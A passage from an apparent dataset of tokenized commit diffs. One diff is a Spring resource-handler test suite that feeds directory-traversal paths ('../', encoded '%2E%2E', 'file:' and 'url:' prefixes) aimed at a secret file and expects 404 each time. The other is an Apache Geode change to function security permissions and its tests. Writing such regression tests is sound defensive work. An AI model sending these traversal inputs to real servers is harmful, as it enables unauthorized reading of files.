");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "@", "@", "-", "16", ",", "6", "+", "16", ",", "10", "@", "@", "package", "org", ".", "springframework", ".", "web", ".", "servlet", ".", "resource", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertSame", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertTrue", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "List", ";", "@", "@", "-", "26", ",", "14", "+", "30", ",", "13", "@", "@", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "UrlResource", ";", "import", "org", ".", "springframework", ".", "mock", ".", "web", ".", "test", ".", "MockHttpServletRequest", ";", "import", "org", ".", "springframework", ".", "mock", ".", "web", ".", "test", ".", "MockHttpServletResponse", ";", "import", "org", ".", "springframework", ".", "mock", ".", "web", ".", "test", ".", "MockServletContext", ";", "import", "org", ".", "springframework", ".", "web", ".", "HttpRequestMethodNotSupportedException", ";", "import", "org", ".", "springframework", ".", "web", ".", "servlet", ".", "HandlerMapping", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "*;", "/", "**", "*", "@", "author", "Keith", "Donald", "*", "@", "author", "Jeremy", "Grelle", "@", "@", "-", "124", ",", "28", "+", "127", ",", "76", "@", "@", "public", "void", "getResourceFromSubDirectoryOfAlternatePath", "(", ")", "throws", "Exception", "{", "assertEquals", "(", "\"", "function", "foo", "(", ")", "{", "console", ".", "log", "(", "\\\"", "hello", "world", "\\", "\")", ";", "}", "\",", "response", ".", "getContentAsString", "(", "))", ";", "}", "@", "Test", "public", "void", "getResourceViaDirectoryTraversal", "(", ")", "throws", "Exception", "{", "public", "void", "invalidPath", "(", ")", "throws", "Exception", "{", "MockHttpServletRequest", "request", "=", "new", "MockHttpServletRequest", "(", ");", "request", ".", "setMethod", "(", "\"", "GET", "\"", ");", "request", ".", "setAttribute", "(", "HandlerMapping", ".", "PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE", ",", "\"", "..", "/", "testsecret", "/", "secret", ".", "txt", "\"", ");", "MockHttpServletResponse", "response", "=", "new", "MockHttpServletResponse", "(", ");", "handler", ".", "handleRequest", "(", "request", ",", "response", ")", ";", "assertEquals", "(", "404", ",", "response", ".", "getStatus", "(", "))", ";", "request", ".", "setAttribute", "(", "HandlerMapping", ".", "PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE", ",", "\"", "test", "/", "..", "/.", "./", "testsecret", "/", "secret", ".", "txt", "\"", ");", "Resource", "location", "=", "new", "ClassPathResource", "(", "\"", "test", "/", "\",", "getClass", "(", "))", ";", "this", ".", "handler", ".", "setLocations", "(", "Arrays", ".", "asList", "(", "location", ")", ");", "testInvalidPath", "(", "location", ",", "\"", "..", "/", "testsecret", "/", "secret", ".", "txt", "\"", ",", "request", ",", "response", ")", ";", "testInvalidPath", "(", "location", ",", "\"", "test", "/", "..", "/.", "./", "testsecret", "/", "secret", ".", "txt", "\"", ",", "request", ",", "response", ")", ";", "testInvalidPath", "(", "location", ",", "\"", ":/", "..", "/.", "./", "testsecret", "/", "secret", ".", "txt", "\"", ",", "request", ",", "response", ")", ";", "location", "=", "new", "UrlResource", "(", "getClass", "(", ").", "getResource", "(", "\".", "/", "test", "/", "\")", ");", "this", ".", "handler", ".", "setLocations", "(", "Arrays", ".", "asList", "(", "location", ")", ");", "Resource", "secretResource", "=", "new", "UrlResource", "(", "getClass", "(", ").", "getResource", "(", "\"", "testsecret", "/", "secret", ".", "txt", "\"", "))", ";", "String", "secretPath", "=", "secretResource", ".", "getURL", "(", ").", "getPath", "(", ");", "testInvalidPath", "(", "location", ",", "\"", "file", ":", "\"", "+", "secretPath", ",", "request", ",", "response", ")", ";", "testInvalidPath", "(", "location", ",", "\"", "/", "file", ":", "\"", "+", "secretPath", ",", "request", ",", "response", ")", ";", "testInvalidPath", "(", "location", ",", "\"", "url", ":", "\"", "+", "secretPath", ",", "request", ",", "response", ")", ";", "testInvalidPath", "(", "location", ",", "\"", "/", "url", ":", "\"", "+", "secretPath", ",", "request", ",", "response", ")", ";", "testInvalidPath", "(", "location", ",", "\"", "/\"", "+", "secretPath", ",", "request", ",", "response", ")", ";", "testInvalidPath", "(", "location", ",", "\"", "//", "//", "..", "/.", ".\"", "+", "secretPath", ",", "request", ",", "response", ")", ";", "testInvalidPath", "(", "location", ",", "\"", "/%", "2E", "%", "2E", "/", "testsecret", "/", "secret", ".", "txt", "\"", ",", "request", ",", "response", ")", ";", "testInvalidPath", "(", "location", ",", "\"", "/%", "2e", "%", "2e", "/", "testsecret", "/", "secret", ".", "txt", "\"", ",", "request", ",", "response", ")", ";", "testInvalidPath", "(", "location", ",", "\"", "\"", "+", "secretPath", ",", "request", ",", "response", ")", ";", "testInvalidPath", "(", "location", ",", "\"", "/", "\"", "+", "secretPath", ",", "request", ",", "response", ")", ";", "testInvalidPath", "(", "location", ",", "\"", "url", ":", "\"", "+", "secretPath", ",", "request", ",", "response", ")", ";", "}", "@", "Test", "public", "void", "ignoreInvalidEscapeSequence", "(", ")", "throws", "Exception", "{", "MockHttpServletRequest", "request", "=", "new", "MockHttpServletRequest", "(", ");", "request", ".", "setMethod", "(", "\"", "GET", "\"", ");", "MockHttpServletResponse", "response", "=", "new", "MockHttpServletResponse", "(", ");", "request", ".", "setAttribute", "(", "HandlerMapping", ".", "PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE", ",", "\"", "/%", "foo", "%", "/", "bar", ".", "txt", "\"", ");", "response", "=", "new", "MockHttpServletResponse", "(", ");", "handler", ".", "handleRequest", "(", "request", ",", "response", ")", ";", "this", ".", "handler", ".", "handleRequest", "(", "request", ",", "response", ")", ";", "assertEquals", "(", "404", ",", "response", ".", "getStatus", "(", "))", ";", "}", "handler", ".", "setLocations", "(", "Arrays", ".", "<", "Resource", ">", "asList", "(", "new", "ClassPathResource", "(", "\"", "testsecret", "/", "\",", "getClass", "(", "))", "))", ";", "request", ".", "setAttribute", "(", "HandlerMapping", ".", "PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE", ",", "\"", "secret", ".", "txt", "\"", ");", "response", "=", "new", "MockHttpServletResponse", "(", ");", "handler", ".", "handleRequest", "(", "request", ",", "response", ")", ";", "assertEquals", "(", "200", ",", "response", ".", "getStatus", "(", "))", ";", "assertEquals", "(", "\"", "text", "/", "plain", "\"", ",", "response", ".", "getContentType", "(", "))", ";", "assertEquals", "(", "\"", "big", "secret", "\"", ",", "response", ".", "getContentAsString", "(", "))", ";", "@", "Test", "public", "void", "processPath", "(", ")", "throws", "Exception", "{", "assertSame", "(", "\"/", "foo", "/", "bar", "\"", ",", "this", ".", "handler", ".", "processPath", "(", "\"/", "foo", "/", "bar", "\"", "))", ";", "assertSame", "(", "\"", "foo", "/", "bar", "\"", ",", "this", ".", "handler", ".", "processPath", "(", "\"", "foo", "/", "bar", "\"", "))", ";", "/", "/", "leading", "whitespace", "control", "characters", "(", "00", "-", "1F", ")", "assertEquals", "(", "\"/", "foo", "/", "bar", "\"", ",", "this", ".", "handler", ".", "processPath", "(", "\"", "/", "foo", "/", "bar", "\"", "))", ";", "assertEquals", "(", "\"/", "foo", "/", "bar", "\"", ",", "this", ".", "handler", ".", "processPath", "(", "(", "char", ")", "1", "+", "\"", "/", "foo", "/", "bar", "\"", "))", ";", "assertEquals", "(", "\"/", "foo", "/", "bar", "\"", ",", "this", ".", "handler", ".", "processPath", "(", "(", "char", ")", "31", "+", "\"", "/", "foo", "/", "bar", "\"", "))", ";", "assertEquals", "(", "\"", "foo", "/", "bar", "\"", ",", "this", ".", "handler", ".", "processPath", "(", "\"", "foo", "/", "bar", "\"", "))", ";", "assertEquals", "(", "\"", "foo", "/", "bar", "\"", ",", "this", ".", "handler", ".", "processPath", "(", "(", "char", ")", "31", "+", "\"", "foo", "/", "bar", "\"", "))", ";", "/", "/", "leading", "control", "character", "0x7F", "(", "DEL", ")", "assertEquals", "(", "\"/", "foo", "/", "bar", "\"", ",", "this", ".", "handler", ".", "processPath", "(", "(", "char", ")", "127", "+", "\"", "/", "foo", "/", "bar", "\"", "))", ";", "assertEquals", "(", "\"/", "foo", "/", "bar", "\"", ",", "this", ".", "handler", ".", "processPath", "(", "(", "char", ")", "127", "+", "\"", "/", "foo", "/", "bar", "\"", "))", ";", "/", "/", "leading", "control", "and", "'", "/'", "characters", "assertEquals", "(", "\"/", "foo", "/", "bar", "\"", ",", "this", ".", "handler", ".", "processPath", "(", "\"", "/", "foo", "/", "bar", "\"", "))", ";", "assertEquals", "(", "\"/", "foo", "/", "bar", "\"", ",", "this", ".", "handler", ".", "processPath", "(", "\"", "/", "/", "foo", "/", "bar", "\"", "))", ";", "assertEquals", "(", "\"/", "foo", "/", "bar", "\"", ",", "this", ".", "handler", ".", "processPath", "(", "\"", "/", "/", "/", "//", "/", "//", "/", "foo", "/", "bar", "\"", "))", ";", "assertEquals", "(", "\"/", "foo", "/", "bar", "\"", ",", "this", ".", "handler", ".", "processPath", "(", "(", "char", ")", "1", "+", "\"", "/", "\"", "+", "(", "char", ")", "127", "+", "\"", "/", "/", "foo", "/", "bar", "\"", "))", ";", "/", "/", "root", "ot", "empty", "path", "assertEquals", "(", "\"\"", ",", "this", ".", "handler", ".", "processPath", "(", "\"", "\"", "))", ";", "assertEquals", "(", "\"/", "\",", "this", ".", "handler", ".", "processPath", "(", "\"/", "\")", ");", "assertEquals", "(", "\"/", "\",", "this", ".", "handler", ".", "processPath", "(", "\"/", "//", "\")", ");", "assertEquals", "(", "\"/", "\",", "this", ".", "handler", ".", "processPath", "(", "\"/", "/", "/", "\"", "))", ";", "}", "@", "Test", "@", "@", "-", "219", ",", "6", "+", "270", ",", "16", "@", "@", "public", "void", "resourceNotFound", "(", ")", "throws", "Exception", "{", "assertEquals", "(", "404", ",", "response", ".", "getStatus", "(", "))", ";", "}", "private", "void", "testInvalidPath", "(", "Resource", "location", ",", "String", "requestPath", ",", "MockHttpServletRequest", "request", ",", "MockHttpServletResponse", "response", ")", "throws", "Exception", "{", "request", ".", "setAttribute", "(", "HandlerMapping", ".", "PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE", ",", "requestPath", ")", ";", "response", "=", "new", "MockHttpServletResponse", "(", ");", "this", ".", "handler", ".", "handleRequest", "(", "request", ",", "response", ")", ";", "assertTrue", "(", "location", ".", "createRelative", "(", "requestPath", ")", ".", "exists", "(", "))", ";", "assertEquals", "(", "404", ",", "response", ".", "getStatus", "(", "))", ";", "}", "private", "static", "class", "TestServletContext", "extends", "MockServletContext", "{"], "docstring_tokens": ["directory", "traversal"]}
{"contents": ["GEODE-3974:", "function", "security", "improvement", "(#1287)", "*", "GEODE-3974:", "function", "security", "improvement", "*", "function", "executed", "on", "a", "local", "member", "does", "not", "log", "out", "user", "accidentally", "*", "Mark", "some", "internal", "functions", "as", "InternalEntity", "*", "test", "refactor"], "code_tokens": ["@", "@", "-", "33", ",", "7", "+", "33", ",", "6", "@", "@", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Region", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "RegionAttributes", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Scope", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "client", ".", "ClientCache", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "Function", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionContext", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "partition", ".", "PartitionRegionHelper", ";", "@", "@", "-", "64", ",", "19", "+", "63", ",", "10", "@", "@", "\"", "__regionConfigurationMetadata", "\"", ";", "public", "CreateRegionFunction", "(", ")", "{", "this", "(", "CacheFactory", ".", "getAnyInstance", "(", "))", ";", "}", "public", "CreateRegionFunction", "(", "Cache", "cache", ")", "{", "this", ".", "cache", "=", "cache", ";", "this", ".", "cache", "=", "CacheFactory", ".", "getAnyInstance", "(", ");", "this", ".", "regionConfigurationsRegion", "=", "createRegionConfigurationMetadataRegion", "(", ");", "}", "public", "CreateRegionFunction", "(", "ClientCache", "cache", ")", "{", "this", ".", "cache", "=", "null", ";", "this", ".", "regionConfigurationsRegion", "=", "null", ";", "}", "public", "void", "execute", "(", "FunctionContext", "context", ")", "{", "RegionConfiguration", "configuration", "=", "(", "RegionConfiguration", ")", "context", ".", "getArguments", "(", ");", "if", "(", "this", ".", "cache", ".", "getLogger", "(", ").", "fineEnabled", "(", "))", "{", "@", "@", "-", "24", ",", "7", "+", "24", ",", "6", "@", "@", "import", "org", ".", "apache", ".", "geode", ".", "DataSerializable", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Cache", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "CacheFactory", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Declarable", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Region", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "Function", ";", "@", "@", "-", "42", ",", "31", "+", "41", ",", "22", "@", "@", "private", "static", "final", "long", "serialVersionUID", "=", "-", "3700389655056961153L", ";", "private", "final", "Cache", "cache", ";", "public", "static", "final", "String", "ID", "=", "\"", "touch", "-", "partitioned", "-", "region", "-", "entries", "\"", ";", "public", "TouchPartitionedRegionEntriesFunction", "(", ")", "{", "this", "(", "CacheFactory", ".", "getAnyInstance", "(", "))", ";", "}", "public", "TouchPartitionedRegionEntriesFunction", "(", "Cache", "cache", ")", "{", "this", ".", "cache", "=", "cache", ";", "}", "@", "SuppressWarnings", "(", "\"", "unchecked", "\"", ")", "public", "void", "execute", "(", "FunctionContext", "context", ")", "{", "RegionFunctionContext", "rfc", "=", "(", "RegionFunctionContext", ")", "context", ";", "Set", "<", "String", ">", "keys", "=", "(", "Set", "<", "String", ">", ")", "rfc", ".", "getFilter", "(", ");", "Cache", "cache", "=", "context", ".", "getCache", "(", ");", "/", "/", "Get", "local", "(", "primary", ")", "data", "for", "the", "context", "Region", "primaryDataSet", "=", "PartitionRegionHelper", ".", "getLocalDataForContext", "(", "rfc", ")", ";", "if", "(", "this", ".", "cache", ".", "getLogger", "(", ").", "fineEnabled", "(", "))", "{", "if", "(", "cache", ".", "getLogger", "(", ").", "fineEnabled", "(", "))", "{", "StringBuilder", "builder", "=", "new", "StringBuilder", "(", ");", "builder", ".", "append", "(", "\"", "Function", "\"", ").", "append", "(", "ID", ")", ".", "append", "(", "\"", "received", "request", "to", "touch", "\"", ")", ".", "append", "(", "primaryDataSet", ".", "getFullPath", "(", "))", ".", "append", "(", "\"-", ">\"", ").", "append", "(", "keys", ")", ";", "this", ".", "cache", ".", "getLogger", "(", ").", "fine", "(", "builder", ".", "toString", "(", "))", ";", "cache", ".", "getLogger", "(", ").", "fine", "(", "builder", ".", "toString", "(", "))", ";", "}", "/", "/", "Retrieve", "each", "value", "to", "update", "the", "lastAccessedTime", ".", "@", "@", "-", "24", ",", "11", "+", "24", ",", "11", "@", "@", "import", "org", ".", "apache", ".", "geode", ".", "DataSerializable", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Cache", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "CacheFactory", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Declarable", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Region", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "Function", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionContext", ";", "import", "org", ".", "apache", ".", "geode", ".", "management", ".", "internal", ".", "security", ".", "ResourcePermissions", ";", "import", "org", ".", "apache", ".", "geode", ".", "security", ".", "ResourcePermission", ";", "/", "**", "@", "@", "-", "41", ",", "31", "+", "41", ",", "22", "@", "@", "private", "static", "final", "long", "serialVersionUID", "=", "-", "7424895036162243564L", ";", "private", "final", "Cache", "cache", ";", "public", "static", "final", "String", "ID", "=", "\"", "touch", "-", "replicated", "-", "region", "-", "entries", "\"", ";", "public", "TouchReplicatedRegionEntriesFunction", "(", ")", "{", "this", "(", "CacheFactory", ".", "getAnyInstance", "(", "))", ";", "}", "public", "TouchReplicatedRegionEntriesFunction", "(", "Cache", "cache", ")", "{", "this", ".", "cache", "=", "cache", ";", "}", "public", "void", "execute", "(", "FunctionContext", "context", ")", "{", "Object", "[", "]", "arguments", "=", "(", "Object", "[", "])", "context", ".", "getArguments", "(", ");", "Cache", "cache", "=", "context", ".", "getCache", "(", ");", "String", "regionName", "=", "(", "String", ")", "arguments", "[", "0", "]", ";", "Set", "<", "String", ">", "keys", "=", "(", "Set", "<", "String", ">", ")", "arguments", "[", "1", "]", ";", "if", "(", "this", ".", "cache", ".", "getLogger", "(", ").", "fineEnabled", "(", "))", "{", "if", "(", "cache", ".", "getLogger", "(", ").", "fineEnabled", "(", "))", "{", "StringBuilder", "builder", "=", "new", "StringBuilder", "(", ");", "builder", ".", "append", "(", "\"", "Function", "\"", ").", "append", "(", "ID", ")", ".", "append", "(", "\"", "received", "request", "to", "touch", "\"", ")", ".", "append", "(", "regionName", ")", ".", "append", "(", "\"-", ">\"", ").", "append", "(", "keys", ")", ";", "this", ".", "cache", ".", "getLogger", "(", ").", "fine", "(", "builder", ".", "toString", "(", "))", ";", "cache", ".", "getLogger", "(", ").", "fine", "(", "builder", ".", "toString", "(", "))", ";", "}", "/", "/", "Retrieve", "the", "appropriate", "Region", "and", "value", "to", "update", "the", "lastAccessedTime", "Region", "region", "=", "this", ".", "cache", ".", "getRegion", "(", "regionName", ")", ";", "Region", "region", "=", "cache", ".", "getRegion", "(", "regionName", ")", ";", "if", "(", "region", "!", "=", "null", ")", "{", "region", ".", "getAll", "(", "keys", ")", ";", "}", "@", "@", "-", "75", ",", "9", "+", "66", ",", "10", "@", "@", "public", "void", "execute", "(", "FunctionContext", "context", ")", "{", "}", "@", "Override", "/", "/", "the", "actual", "regionName", "used", "in", "the", "function", "body", "is", "passed", "in", "as", "an", "function", "arugment", ",", "/", "/", "this", "regionName", "is", "not", "really", "used", "in", "function", ".", "Hence", "requiring", "DATA", ":", "READ", "on", "all", "regions", "public", "Collection", "<", "ResourcePermission", ">", "getRequiredPermissions", "(", "String", "regionName", ")", "{", "return", "Collections", ".", "singletonList", "(", "new", "ResourcePermission", "(", "ResourcePermission", ".", "Resource", ".", "DATA", ",", "ResourcePermission", ".", "Operation", ".", "READ", ",", "regionName", ")", ");", "return", "Collections", ".", "singletonList", "(", "ResourcePermissions", ".", "DATA_READ", ")", ";", "}", "public", "String", "getId", "(", ")", "{", "@", "@", "-", "15", ",", "13", "+", "15", ",", "17", "@", "@", "package", "org", ".", "apache", ".", "geode", ".", "modules", ".", "util", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "org", ".", "junit", ".", "BeforeClass", ";", "import", "org", ".", "junit", ".", "ClassRule", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "junit", ".", "experimental", ".", "categories", ".", "Category", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "RegionShortcut", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "Function", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionService", ";", "import", "org", ".", "apache", ".", "geode", ".", "examples", ".", "SimpleSecurityManager", ";", "import", "org", ".", "apache", ".", "geode", ".", "test", ".", "junit", ".", "categories", ".", "IntegrationTest", ";", "@", "@", "-", "38", ",", "66", "+", "42", ",", "34", "@", "@", "@", "ClassRule", "public", "static", "ServerStarterRule", "server", "=", "new", "ServerStarterRule", "(", ").", "withJMXManager", "(", ").", "withSecurityManager", "(", "SimpleSecurityManager", ".", "class", ")", ".", "withRegion", "(", "RegionShortcut", ".", "REPLICATE", ",", "\"", "REPLICATE_1", "\"", ")", ".", "withRegion", "(", "RegionShortcut", ".", "PARTITION", ",", "\"", "PARTITION_1", "\"", ").", "withAutoStart", "(", ");", ".", "withRegion", "(", "RegionShortcut", ".", "REPLICATE", ",", "\"", "AuthRegion", "\"", ").", "withAutoStart", "(", ");", "@", "Rule", "public", "GfshCommandRule", "gfsh", "=", "new", "GfshCommandRule", "(", "server", ":", ":", "getJmxPort", ",", "GfshCommandRule", ".", "PortType", ".", "jmxManager", ")", ";", "private", "static", "Map", "<", "Function", ",", "String", ">", "functionStringMap", "=", "new", "HashMap", "<", ">(", ");", "@", "BeforeClass", "public", "static", "void", "setupClass", "(", ")", "{", "FunctionService", ".", "registerFunction", "(", "new", "BootstrappingFunction", "(", "))", ";", "FunctionService", ".", "registerFunction", "(", "new", "CreateRegionFunction", "(", "))", ";", "FunctionService", ".", "registerFunction", "(", "new", "RegionSizeFunction", "(", "))", ";", "FunctionService", ".", "registerFunction", "(", "new", "TouchPartitionedRegionEntriesFunction", "(", "))", ";", "FunctionService", ".", "registerFunction", "(", "new", "TouchReplicatedRegionEntriesFunction", "(", "))", ";", "}", "functionStringMap", ".", "put", "(", "new", "BootstrappingFunction", "(", "),", "\"", "CLUSTER", ":", "MANAGE", "\"", ");", "functionStringMap", ".", "put", "(", "new", "CreateRegionFunction", "(", "),", "\"", "DATA", ":", "MANAGE", "\"", ");", "functionStringMap", ".", "put", "(", "new", "RegionSizeFunction", "(", "),", "\"", "DATA", ":", "READ", ":", "AuthRegion", "\"", ");", "functionStringMap", ".", "put", "(", "new", "TouchPartitionedRegionEntriesFunction", "(", "),", "\"", "DATA", ":", "READ", ":", "AuthRegion", "\"", ");", "functionStringMap", ".", "put", "(", "new", "TouchReplicatedRegionEntriesFunction", "(", "),", "\"", "DATA", ":", "READ", "\"", ");", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataWrite", "\"", ",", "password", "=", "\"", "dataWrite", "\"", ")", "public", "void", "testInvalidPermissionsForBootstrappingFunction", "(", ")", "throws", "Exception", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "BootstrappingFunction", ".", "ID", ")", ".", "tableHasColumnWithExactValuesInAnyOrder", "(", "RESULT_HEADER", ",", "\"", "Exception", ":", "dataWrite", "not", "authorized", "for", "CLUSTER", ":", "MANAGE", "\"", ")", ".", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataWrite", "\"", ",", "password", "=", "\"", "dataWrite", "\"", ")", "public", "void", "testInvalidPermissionsForCreateRegionFunction", "(", ")", "throws", "Exception", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "CreateRegionFunction", ".", "ID", ")", ".", "tableHasColumnWithExactValuesInAnyOrder", "(", "RESULT_HEADER", ",", "\"", "Exception", ":", "dataWrite", "not", "authorized", "for", "DATA", ":", "MANAGE", "\"", ")", ".", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataWrite", "\"", ",", "password", "=", "\"", "dataWrite", "\"", ")", "public", "void", "testInvalidPermissionsForRegionSizeFunction", "(", ")", "throws", "Exception", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "REPLICATE_1", "-", "-", "id", "=", "\"", "+", "RegionSizeFunction", ".", "ID", ")", ".", "tableHasColumnWithExactValuesInAnyOrder", "(", "RESULT_HEADER", ",", "\"", "Exception", ":", "dataWrite", "not", "authorized", "for", "DATA", ":", "READ", ":", "REPLICATE_1", "\"", ")", ".", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataWrite", "\"", ",", "password", "=", "\"", "dataWrite", "\"", ")", "public", "void", "testInvalidPermissionsForTouchPartitionedRegionEntriesFunction", "(", ")", "throws", "Exception", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "PARTITION_1", "-", "-", "id", "=", "\"", "+", "TouchPartitionedRegionEntriesFunction", ".", "ID", ")", ".", "tableHasColumnWithExactValuesInAnyOrder", "(", "RESULT_HEADER", ",", "\"", "Exception", ":", "dataWrite", "not", "authorized", "for", "DATA", ":", "READ", ":", "PARTITION_1", "\"", ")", ".", "statusIsError", "(", ");", "functionStringMap", ".", "keySet", "(", ").", "forEach", "(", "FunctionService", ":", ":", "registerFunction", ")", ";", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataWrite", "\"", ",", "password", "=", "\"", "dataWrite", "\"", ")", "public", "void", "testInvalidPermissionsForTouchReplicatedRegionEntriesFunction", "(", ")", "throws", "Exception", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "REPLICATE_1", "-", "-", "id", "=", "\"", "+", "TouchReplicatedRegionEntriesFunction", ".", "ID", ")", ".", "tableHasColumnWithExactValuesInAnyOrder", "(", "RESULT_HEADER", ",", "\"", "Exception", ":", "dataWrite", "not", "authorized", "for", "DATA", ":", "READ", ":", "REPLICATE_1", "\"", ")", ".", "statusIsError", "(", ");", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "user", "\"", ",", "password", "=", "\"", "user", "\"", ")", "public", "void", "functionRequireExpectedPermission", "(", ")", "throws", "Exception", "{", "functionStringMap", ".", "entrySet", "(", ").", "stream", "(", ").", "forEach", "(", "entry", "-", ">", "{", "Function", "function", "=", "entry", ".", "getKey", "(", ");", "String", "permission", "=", "entry", ".", "getValue", "(", ");", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "AuthRegion", "-", "-", "id", "=", "\"", "+", "function", ".", "getId", "(", "))", ".", "tableHasRowCount", "(", "RESULT_HEADER", ",", "1", ")", ".", "tableHasColumnWithValuesContaining", "(", "RESULT_HEADER", ",", "permission", ")", ".", "statusIsError", "(", ");", "}", ");", "}", "}", "@", "@", "-", "15", ",", "6", "+", "15", ",", "9", "@", "@", "package", "org", ".", "apache", ".", "geode", ".", "connectors", ".", "jdbc", ".", "internal", ".", "cli", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "org", ".", "junit", ".", "BeforeClass", ";", "import", "org", ".", "junit", ".", "ClassRule", ";", "import", "org", ".", "junit", ".", "Rule", ";", "@", "@", "-", "48", ",", "20", "+", "51", ",", "6", "@", "@", "CliFunctionResult", "getFunctionResult", "(", "JdbcConnectorService", "service", ",", "@", "Category", "(", "{", "IntegrationTest", ".", "class", ",", "SecurityException", ".", "class", "}", ")", "public", "class", "JDBCConnectorFunctionsSecurityTest", "{", "private", "static", "Function", "alterConnectionFunction", "=", "new", "AlterConnectionFunction", "(", ");", "private", "static", "Function", "alterMappingFunction", "=", "new", "AlterMappingFunction", "(", ");", "private", "static", "Function", "createConnectionFunction", "=", "new", "CreateConnectionFunction", "(", ");", "private", "static", "Function", "createMappingFunction", "=", "new", "CreateMappingFunction", "(", ");", "private", "static", "Function", "describeConnectionFunction", "=", "new", "DescribeConnectionFunction", "(", ");", "private", "static", "Function", "describeMappingFunction", "=", "new", "DescribeMappingFunction", "(", ");", "private", "static", "Function", "destroyConnectionFunction", "=", "new", "DestroyConnectionFunction", "(", ");", "private", "static", "Function", "destroyMappingFunction", "=", "new", "DestroyMappingFunction", "(", ");", "private", "static", "Function", "listConnectionFunction", "=", "new", "ListConnectionFunction", "(", ");", "private", "static", "Function", "listMappingFunction", "=", "new", "ListMappingFunction", "(", ");", "private", "static", "Function", "inheritsDefaultPermissionsFunction", "=", "new", "InheritsDefaultPermissionsJDBCFunction", "(", ");", "@", "ClassRule", "public", "static", "ServerStarterRule", "server", "=", "new", "ServerStarterRule", "(", ").", "withJMXManager", "(", ")", ".", "withSecurityManager", "(", "SimpleSecurityManager", ".", "class", ")", ".", "withAutoStart", "(", ");", "@", "@", "-", "70", ",", "81", "+", "59", ",", "35", "@", "@", "CliFunctionResult", "getFunctionResult", "(", "JdbcConnectorService", "service", ",", "public", "GfshCommandRule", "gfsh", "=", "new", "GfshCommandRule", "(", "server", ":", ":", "getJmxPort", ",", "GfshCommandRule", ".", "PortType", ".", "jmxManager", ")", ";", "private", "static", "Map", "<", "Function", ",", "String", ">", "functionStringMap", "=", "new", "HashMap", "<", ">(", ");", "@", "BeforeClass", "public", "static", "void", "setupClass", "(", ")", "{", "FunctionService", ".", "registerFunction", "(", "alterConnectionFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "alterMappingFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "createConnectionFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "createMappingFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "describeConnectionFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "describeMappingFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "destroyConnectionFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "destroyMappingFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "listConnectionFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "listMappingFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "inheritsDefaultPermissionsFunction", ")", ";", "}", "@", "Test", "@", 